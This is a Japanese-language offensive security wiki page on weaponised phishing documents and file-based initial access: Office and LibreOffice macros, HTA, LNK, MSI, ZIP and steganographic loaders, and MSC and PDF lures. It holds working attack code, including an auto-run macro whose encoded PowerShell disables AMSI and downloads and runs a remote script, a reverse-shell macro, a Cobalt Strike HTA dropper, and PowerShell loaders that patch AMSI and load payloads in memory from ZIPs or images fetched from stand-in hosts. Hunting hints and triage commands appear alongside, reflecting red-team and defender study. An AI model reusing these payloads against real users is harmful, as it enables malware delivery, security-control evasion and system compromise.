# フィッシングファイルとドキュメント

{{#include ../../banners/hacktricks-training.md}}

## Office ドキュメント

Microsoft Word はファイルを開く前に、ファイルデータの検証を行います。検証は、OfficeOpenXML 標準に基づいてデータ構造を識別する形で行われます。データ構造の識別中にエラーが発生すると、解析対象のファイルは開かれません。

通常、マクロを含む Word ファイルには `.docm` 拡張子が使われます。しかし、ファイル拡張子を変更して名前を変更しても、マクロの実行機能を維持できます。\
たとえば、RTF ファイルは仕様上マクロをサポートしていませんが、DOCM ファイルの拡張子を RTF に変更すると、Microsoft Word で処理され、マクロを実行できるようになります。\
同じ内部構造と仕組みは、Microsoft Office Suite のすべてのソフトウェア（Excel、PowerPoint など）に当てはまります。

次のコマンドを使うと、一部の Office プログラムで実行される拡張子を確認できます。

```bash
assoc | findstr /i "word excel powerp"
```

DOCXファイルは、マクロを含むリモートテンプレート（File –Options –Add-ins –Manage: Templates –Go）を参照することで、マクロを「実行」することもできます。

### 外部画像の読み込み

移動先: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - 外部画像の読み込み: 移動先: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

ドキュメントを作成するのではなく、受信したドキュメントを解析する場合は、[VBA macro analysis: junk code and UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms)を参照してください。

### マクロのバックドア

マクロを使用して、ドキュメントから任意のコードを実行できます。

#### 自動読み込み関数

これらの使用頻度が高いほど、AVに検出される可能性も高くなります。

- AutoOpen()
- Document_Open()

#### マクロのコード例

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### メタデータを手動で削除する

**File > Info > Inspect Document > Inspect Document** に移動すると、Document Inspector が開きます。**Inspect** をクリックし、**Document Properties and Personal Information** の横にある **Remove All** をクリックします。

#### Doc 拡張子

完了したら、**Save as type** のドロップダウンを選択し、形式を **`.docx`** から Word 97-2003 **`.doc`** に変更します。\
これは、**`.docx` には macro を保存できず**、macro 対応の **`.docm`** 拡張子には**敬遠される傾向がある**ためです（例: サムネイルアイコンに大きな `!` が表示され、一部の web/email gateway では完全にブロックされます）。したがって、この**旧式の `.doc` 拡張子が最善の妥協案**です。

#### Malicious Macro Generator

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT の自動実行マクロ（Basic）

LibreOffice Writer の文書には Basic macro を埋め込み、macro を **Open Document** イベントに割り当てることで、ファイルを開いたときに自動実行できます（Tools → Customize → Events → Open Document → Macro…）。<sup>[[1]](#references)</sup> シンプルな reverse shell macro は次のとおりです。

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

二重引用符（`""`）が文字列内にある点に注意してください。LibreOffice Basicでは、リテラルの引用符をエスケープするために使用されます。そのため、`...==""")` で終わるpayloadでは、内部コマンドとShell引数の両方の引用符が正しく閉じられます。

配信のヒント:

- `.odt` として保存し、ドキュメントイベントにマクロを割り当てて、開いたときにすぐ実行されるようにします。
- `swaks` でメールを送信するときは、`--attach @resume.odt` を使用してください（添付ファイルとしてファイル名の文字列ではなくファイルのバイト列が送信されるよう、`@` が必要です）。これは、検証なしで任意の `RCPT TO` 宛先を受け入れるSMTPサーバーを悪用する場合に重要です。

## HTAファイル

HTAは、**HTMLとスクリプト言語（VBScriptやJScriptなど）を組み合わせた**Windowsプログラムです。ユーザーインターフェースを生成し、ブラウザーのセキュリティモデルによる制約を受けずに、「完全に信頼された」アプリケーションとして実行されます。

HTAは**`mshta.exe`**を使って実行されます。通常、これは**Internet Explorerとともにインストール**されるため、`mshta` はIEに依存します。そのため、IEがアンインストールされていると、HTAは実行できません。

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## HTMLメール内の偽装添付ファイルカード

HTMLメールでは、実際の添付ファイルを含めずに、メールプロバイダーのネイティブな添付ファイルプレビューカードを模倣できます。Talosは、Base64エンコードされた4つのインラインPNG MIMEパートから再構築されたGmailカードを確認しました。カード全体は1つのアンカーで囲まれており、`?m=<target-id>` の受信者値によって受信者ごとのトラッキングが可能になっていました。リンクは `http://` や `https://` ではなく `//` で始まっていました。このプロトコル相対形式はブラウザーで解決されますが、完全修飾URLのみを照合するURL抽出ツールでは見落とされる可能性があります。<sup>[[11]](#references)</sup>

分析では、レンダリングされた添付ファイル一覧を信用せず、生のMIMEを調べてください。インライン画像パートが視覚的なカードをどのように構成しているかを再構築し、それを囲むアンカーを特定してから、プロトコル相対の `href` 値を正規化してURLを抽出します。<sup>[[11]](#references)</sup>

エンベロープ／ヘッダーの送信者偽装とDMARCアライメントのテストについては、[SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender)を参照してください。

## NTLM Authenticationの強制

**NTLM authenticationを「リモートで」強制する**方法はいくつかあります。たとえば、ユーザーがアクセスするメールやHTMLに**不可視画像**を追加できます（HTTP MitMでも可能でしょうか？）。また、**フォルダーを開くだけで**認証が**トリガー**される**ファイルのアドレス**を被害者に送る方法もあります。

**以下のページで、これらの方法やその他のアイデアを確認してください:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

ハッシュや認証情報を盗むだけでなく、**NTLM relay attacksも実行できる**ことを忘れないでください。

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## `ftp.exe` を使ったLNKによるローカルコマンドのステージング

ショートカットから `ftp.exe -s:icon.ico` を起動し、画像拡張子に偽装したテキスト形式のコマンドファイルを読み込ませることができます。<sup>[[12]](#references)</sup> `-s:` オプションはローカルのFTPコマンドを読み込みます。Windows 8以降では、このファイルをUTF-8でエンコードする必要があります。<sup>[[13]](#references)</sup> `!` で始まる行は、FTPサーバーにコマンドを送信せず、`cmd /c` を介してローカルコマンドを実行します。このローカル実行経路では、FTP接続は不要です。<sup>[[14]](#references)</sup> 報告された手法では、FTPスクリプトから2つ目のコマンドファイルに到達していました。`!` で始まる行全体が重要です。`!more res.ico` だけならファイルを表示しますが、`cmd` へのパイプを使うと内容を実行します。<sup>[[12]](#references)[[14]](#references)</sup>

同じ手法では、更新のたびに新しい実行ファイルをインストールする代わりに、書き込み可能なコマンドファイルを定期タスクで再読み込みしていました。タスクのアクションは `conhost --headless cmd /c more C:\Users\Public\Music\err.log|cmd` で、ファイルには実行時に指示を取得するコマンドが含まれていました。関連する別の手法では、スケジュール実行の前に置き換え用のコマンドファイルをダウンロードしていました。タスクの実行時にファイルが存在し、読み取り可能である必要があります。また、`conhost` によってタスクの権限が、設定されたユーザートークンを超えて昇格することはありません。<sup>[[12]](#references)</sup> タスクの仕組みについては、[scheduled-task execution](../../windows-hardening/lateral-movement/atexec.md)を参照してください。

## 隠しMSIとおとり文書を含むVHDXショートカット

マウントしたVHDXでは、同じボリューム内にMSIとおとりのスプレッドシートを隠したまま、見える場所にLNKを表示できます。報告された手法では、LNKは `cmd.exe /c Visa_Details.msi & Attachment-2.xls` を使用していました。区切り文字 `&` により、インストーラーコマンドが失敗してもおとり文書が開きます。文書が開いたことは、インストールが成功した証拠ではありません。これは[MSI custom-action execution](../../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md)の配布方法の一種であり、それ自体がMSIによる権限昇格というわけではありません。<sup>[[12]](#references)</sup>

このMSIでは、`CustomAction.Type` の **194** は、`Binary` テーブルに格納されたEXE（**2**）に、戻り値を無視するフラグ（**64**）と非同期フラグ（**128**）を組み合わせた値です。**64 + 128** の組み合わせでは、Windows InstallerはEXEの終了を待ちません。128フラグだけの場合は、シーケンスの最後まで待機します。<sup>[[15]](#references)[[16]](#references)</sup> 実行をその埋め込みEXEに帰属させる前に、アクションの `Source` を `Binary` テーブルと照合し、`InstallExecuteSequence` 内の配置を確認してください。<sup>[[12]](#references)[[15]](#references)</sup> [WebDAV UNC path can deliver a remote MSI](../../network-services-pentesting/pentesting-web/put-method-webdav.md#remote-msi-from-a-webdav-unc-path)を使ってリモートMSIを配布できますが、これは別の侵入経路です。

## LNK Loader + ZIP内蔵Payload（fileless chain）

効果的なcampaignでは、正規のおとり文書（PDF/DOCX）2つと悪意のある .lnk を含むZIPを配布します。仕掛けは、実際のPowerShell loaderがZIPの生バイト列内に固有のmarkerの後ろに格納されており、.lnkがそこから切り出して、すべてメモリ上で実行する点です。<sup>[[2]](#references)</sup>

.lnkのPowerShellワンライナーで実装される一般的な流れ:

1) Desktop、Downloads、Documents、%TEMP%、%ProgramData%、および現在の作業ディレクトリの親ディレクトリなど、一般的なパスから元のZIPを探す。
2) ZIPのバイト列を読み込み、ハードコードされたmarker（例: xFIQCV）を探す。marker以降のすべてが埋め込みPowerShell payload。
3) ZIPを%ProgramData%にコピーして展開し、おとりの.docxを開いて正規の動作に見せる。
4) 現在のプロセスでAMSIをバイパスする: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 次のstageを難読化解除する（例: すべての # 文字を削除する）し、メモリ上で実行する。

埋め込みstageを切り出して実行するPowerShellの基本例:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

メモ
- 配信では、信頼性の高いPaaSサブドメイン（例: *.herokuapp.com）が悪用されることが多く、ペイロードの配信を制限する場合があります（IP/UAに応じて無害なZIPを配信するなど）。
- 次のステージでは、base64/XORで暗号化されたshellcodeを復号し、Reflection.Emit + VirtualAlloc経由で実行することが多く、ディスク上の痕跡を最小限に抑えます。

同じチェーンで使われるPersistence
- Microsoft Web BrowserコントロールのCOM TypeLib hijackingにより、IE/Explorerや、このコントロールを埋め込んだアプリがペイロードを自動的に再起動するようにします。<sup>[[2]](#references)[[4]](#references)</sup> 詳細とすぐに使えるコマンドはこちら:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

脅威ハンティング/IOC
- アーカイブデータの末尾にASCIIマーカー文字列（例: xFIQCV）が追加されたZIPファイル。
- 親フォルダー/ユーザーフォルダーを列挙してZIPを探し、おとり文書を開く.lnk。
- [System.Management.Automation.AmsiUtils]::amsiInitFailedによるAMSIの改ざん。
- 信頼性の高いPaaSドメインでホストされたリンクで終わる、長期間続く業務上のスレッド。

## LNKでおとりを先に表示するステージング → scheduled-taskによるPersistence → 信頼されたCPLのサイドローディング

繰り返し確認されるパターンの一つは、**文書を装った`.lnk`**が無害なおとりをただちに開く一方で、バックグラウンドで実際のチェーンを準備するものです。<sup>[[3]](#references)</sup>

確認されたワークフロー:
1. ショートカットは**PDFを装い**、`conhost.exe`などのプロキシを使って、難読化されたPowerShell downloaderを起動します。
2. PowerShellは明白なトークン（`iw''r`、`g''c''i`、`r''e''n`、`c''p''i`、`&(g''cm sch*)`）を分割し、`iwr`、`gci`、`ren`、`cpi`、`schtasks`を探す単純な検知を回避します。
3. stagerは**おとり文書を先にダウンロード**して被害者に開かせ、その後、バックグラウンドで悪意あるファイルを再構築します。
4. ペイロードは**無関係な拡張子**で書き込まれた後、埋め込み文字を削除して名前が変更されることがあります。これにより、明白な`.exe` / `.cpl`の痕跡が現れるのを遅らせます。
5. ユーザーが書き込み可能なパスにある信頼されたホストバイナリを起動する、**分単位のscheduled task**によってPersistenceが確立されます。

このパターンから得られる、最小限のハンティングの手がかり:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

認識しておくと役立つステージング構成:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 2つ目のステージがステルス性に優れている理由

Rapid7のケーススタディでは、スケジュールされたタスクが **`Fondue.exe`** を `C:\Users\Public\` から繰り返し起動していました。**`APPWIZ.cpl`** がその隣に配置され、**`RunFODW`** をエクスポートしていたため、信頼されたMicrosoftのバイナリは正規のシステムコピーではなく、攻撃者のCPLをサイドロードしました。

CPLは次の処理を行います:
- `C:\Windows\Tasks\editor.dat` から **AES-256-CBC** のblobを読み込む
- **Windows CNG / `bcrypt.dll`** を使って復号する
- 実行可能メモリを確保し、復号したshellcodeをコピーする
- shellcodeのポインターを **`EnumUILanguagesW`** のコールバックとして渡し、間接的に実行する

最後の手順は個別にハンティングする価値があります。マルウェアは、直接の `((void(*)())buf)()` ジャンプを避け、実行を移すために、コールバックを受け取る**正規のWinAPI**を悪用することがよくあります。

このキャンペーンで復号されたペイロードは **Donut** shellcodeで、その後、最終PEをすべてメモリ上にマッピングし、実行を引き継ぐ前に現在のプロセス内で **AMSI/WLDP/ETW** にパッチを適用しました。サイドローディングとメモリ常駐型の後処理について詳しくは、以下を参照してください:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

実用的なハンティングの着眼点:
- `.lnk` が `powershell.exe` または `conhost.exe` を起動し、その後、見せかけの文書が表示される。
- `C:\Users\Public\` への短時間のダウンロード後、意味のない拡張子からすぐに名前が変更される。
- `GoogleErrorReport` のような無難な名前のスケジュールされたタスクが、**ユーザーが書き込み可能なディレクトリ**から実行される。
- 信頼されたバイナリが、同じ非システムディレクトリから **`.cpl` / `.dll`** ファイルを読み込む。
- **`C:\Windows\Tasks\`** に書き込まれたBase64のテキストblobが、サイドロードされたモジュールによって読み込まれる。

## 画像内のステガノグラフィ区切りペイロード（PowerShell stager）

最近のローダーチェーンでは、難読化されたJavaScript/VBSが配信され、それがBase64のPowerShell stagerをデコードして実行します。このstagerは画像（多くの場合GIF）をダウンロードします。画像には、固有の開始/終了マーカー間にプレーンテキストとして隠された、Base64エンコード済みの.NET DLLが含まれています。スクリプトはこれらの区切り文字（実際に確認された例: «<<sudo_png>> … <<sudo_odt>>>»）を検索し、間のテキストを抽出してBase64デコードし、バイト列に変換します。その後、アセンブリをメモリ内に読み込み、C2 URLを指定して既知のエントリーメソッドを呼び出します。<sup>[[5]](#references)</sup>

ワークフロー
- ステージ1: アーカイブされたJS/VBSドロッパー → 埋め込みBase64をデコード → `-nop -w hidden -ep bypass` を指定してPowerShell stagerを起動。
- ステージ2: PowerShell stager → 画像をダウンロードし、マーカーで区切られたBase64を切り出して、.NET DLLをメモリ内に読み込み、C2 URLとオプションを渡してそのメソッド（例: VAI）を呼び出す。
- ステージ3: ローダーが最終ペイロードを取得し、通常はプロセスホロウイングを介して、信頼されたバイナリ（一般的にはMSBuild.exe）にインジェクトする。<sup>[[7]](#references)[[8]](#references)</sup> プロセスホロウイングと信頼されたユーティリティを介したプロキシ実行について詳しくは、こちらを参照してください:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

画像からDLLを切り出し、.NETメソッドをメモリ内で呼び出すPowerShellの例:

<details>
<summary>PowerShellのステガノグラフィペイロード抽出・ローダー</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

注記
- これは ATT&CK T1027.003（steganography/marker-hiding）です。<sup>[[6]](#references)</sup> マーカーはキャンペーンごとに異なります。
- AMSI/ETW bypass と文字列の難読化解除は、assembly の読み込み前に一般的に適用されます。
- Hunting: ダウンロードした画像を既知の区切り文字でスキャンし、PowerShell が画像にアクセスして直ちに Base64 blob をデコードしている動作を特定します。

stego tools と carving techniques も参照してください。

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell による staging

繰り返し見られる初期段階では、小さく高度に難読化された `.js` または `.vbs` ファイルがアーカイブ内に配信されます。その唯一の目的は、埋め込まれた Base64 文字列をデコードし、`-nop -w hidden -ep bypass` を指定して PowerShell を起動し、HTTPS 経由で次の stage を開始することです。<sup>[[5]](#references)</sup>

骨格となるロジック（抽象化）:
- 自身のファイルの内容を読み込む
- ジャンク文字列の間にある Base64 blob を見つける
- ASCII の PowerShell にデコードする
- `wscript.exe`/`cscript.exe` から `powershell.exe` を呼び出して実行する

Hunting の手がかり
- アーカイブ内の JS/VBS 添付ファイルが、コマンドラインに `-enc`/`FromBase64String` を含む `powershell.exe` を起動する。
- ユーザーの temp path から `wscript.exe` が `powershell.exe -nop -w hidden` を起動する。

## 実行コンテナとしての MSC documents (GrimResource)

Microsoft Management Console ファイル（`.msc`）は、通常 `mmc.exe` で開かれる XML console 定義です。**GrimResource** は、古い XSS primitive を含む `apds.dll` resource への `StringTable` 参照を悪用するため、細工された console をユーザーが開くと、`mmc.exe` 内で JavaScript が実行されます。確認されたサンプルでは、`transformNode` ベースの難読化と **DotNetToJScript** を組み合わせ、通常の Office macro 経由の手順を使わずに .NET payload をインスタンス化していました。<sup>[[9]](#references)</sup>

静的 triage では、信頼できない MSC をテキストとして扱い、**ダブルクリックしないでください**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

High-signal runtime pivotの兆候は、`mmc.exe`によるCLRまたはscriptコンポーネントの読み込み、ネットワーク接続の作成、`powershell.exe`、`cmd.exe`、`wscript.exe`、`cscript.exe`、`mshta.exe`、`rundll32.exe`、または予期しない実行ファイルの起動です。この形式自体は正規のものなので、すべてのMSCをブロックするのではなく、**起点 + 不審なXML/scriptコンテンツ + `mmc.exe`の挙動**を相関させて検知する必要があります。<sup>[[9]](#references)</sup>

## PDF/QRリダイレクターとpayloadの出し分け

PDFは、悪用可能な脆弱性がなくても有用です。最近のキャンペーンでは、無害そうな文書に**QRコードまたは通常のリンク**を配置し、ブラウザーのセッションをメールの制御外へ移し、宛先を受信者のアドレスに合わせて個別化しています。Microsoftは2025年、QRコードのURLが受信者ごとに異なり、RaccoonO365の認証情報を窃取するインフラストラクチャに誘導するPDFを報告しました。これと並行する一連の手口では、IP/環境による判定を使い、選別された訪問者にはJavaScript/MSIへのパスを返す一方、スキャナーや許可されていないクライアントには無害なPDFを返していました。<sup>[[10]](#references)</sup>

PDFのアクションと、レンダリングしたQRコードの両方をトリアージしてください。QRコードは抽出可能な画像として保存されず、ベクター描画されている場合があるため、埋め込み画像を抽出するだけでなく、すべてのページをラスタライズしてください。

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

隔離された分析システムから、認証せずにデコード後の宛先とリダイレクトを調べます。有用な探索の手掛かりには、本文がほぼ空のQRコードのみのPDF、クエリパラメーターに埋め込まれた受信者のメールアドレス、信頼できるホスティングサービスを経由する複数のリダイレクト、IP、位置情報、cookie、referrer、user agentに応じて返される異なるコンテンツなどがあります。単一のsandbox fetchではおとりしか返されない場合があるため、制御したプロファイルでリクエストを比較します。<sup>[[10]](#references)</sup>

## NTLM hashesを盗むためのWindowsファイル

**NTLM credsを盗める場所**のページを確認してください。

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLineキャンペーン：米国企業を標的とした高度なPhishing攻撃](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode：中国をテーマにしたloaderチェーンを通じてDropping Elephantのtradecraftを追跡](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [TypeLibを乗っ取る – 新しいCOM persistence手法（CICADA8）](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loaderがさまざまなinfostealerを配信](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography（T1027.003）](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing（T1055.012）](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – 信頼された開発者ユーティリティのProxy Execution：MSBuild（T1127.001）](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource：初期アクセスと回避にMicrosoft Management Consoleを利用](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – 脅威アクター、税務シーズンに便乗して税金をテーマにしたPhishingキャンペーンを展開](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587の配信チェーンとAntino backdoor](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
- [12] [FortiGuard Labs - BITTERがPapRATで武器を拡充](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
- [13] [Microsoft Learn - ftpコマンド](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
- [14] [LOLBAS - Ftp.exe](https://lolbas-project.github.io/lolbas/Binaries/Ftp/)
- [15] [Microsoft Learn - Custom Action Type 2](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-type-2)
- [16] [Microsoft Learn - Custom Action Return Processing Options](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options)
{{#include ../../banners/hacktricks-training.md}}
